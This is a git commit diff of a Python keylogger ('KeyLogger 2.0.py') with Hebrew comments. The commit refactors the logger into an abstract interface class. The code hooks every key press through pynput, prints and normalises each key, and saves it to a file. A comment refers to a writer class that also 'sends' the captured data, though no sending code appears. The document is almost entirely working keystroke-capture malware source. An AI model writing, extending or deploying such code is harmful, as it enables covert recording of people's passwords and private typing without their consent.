342b0052a211c54bc2b659e3c2c79c0bf9c89dcd
itzchak <s0527120124@gmail.com>
2025-02-13 14:04:52 +0200

    add start

--- KeyLogger 2.0.py
+++ KeyLogger 2.0.py
@@ -3,26 +3,40 @@ from pynput.keyboard import Key,Listener
 import sys
 from datetime import datetime
 
+
+class IKeyLogger(ABC):
+    @abstractmethod
+    def start_logging(self) -> None:
+        pass
+
+    @abstractmethod
+    def stop_logging(self) -> None:
+        pass
+
+
 # קלאס שאחראי על ההקלטה מפעיל הקלטה בהדלקה ראשונה
-class KeyLogger:
-    def __init__(self):
-        # אחראי על הפעלת פונקציות יפוי ושמירה בכל לחיצה
-        def __on_press(Key):
-            key_nise = self.nurmal_key(Key)
-            # לתקן את הדרך
-            FileWriter().write(key_nise)
+class KeyLogger(IKeyLogger):
+    # אחראי על הפעלת פונקציות יפוי ושמירה בכל לחיצה
+    @staticmethod
+    def __on_press(Key):
+        key_nise = KeyLogger.nurmal_key(Key)
+        print(key_nise)
+        # לתקן את הדרך
+        FileWriter().write(key_nise)
 
         # פןנקציה שמפסיקה את התוכנה אם לחץ על קונטרול שיפט d
-        def on_release(key):
-            try:
-                if key.char == '\x04':  # Ctrl+D
-                    print("Exiting...")
-                    sys.exit(0)
-            except AttributeError:
-                pass
+    @staticmethod
+    def __on_release(key):
+        try:
+            if key.char == '\x04':  # Ctrl+D
+                print("Exiting...")
+                sys.exit(0)
+        except AttributeError:
+            pass
 
 #  מחלקה מופשטת של כותב. מורישה מתודה של כתוב ומתודה של שלח
-        with Listener(on_press=__on_press, on_release=on_release) as listener:
+    def start_logging(self):
+        with Listener(on_press=KeyLogger.__on_press, on_release=KeyLogger.__on_release) as listener:
             listener.join()
 
     # אחראי ליפות את המקש
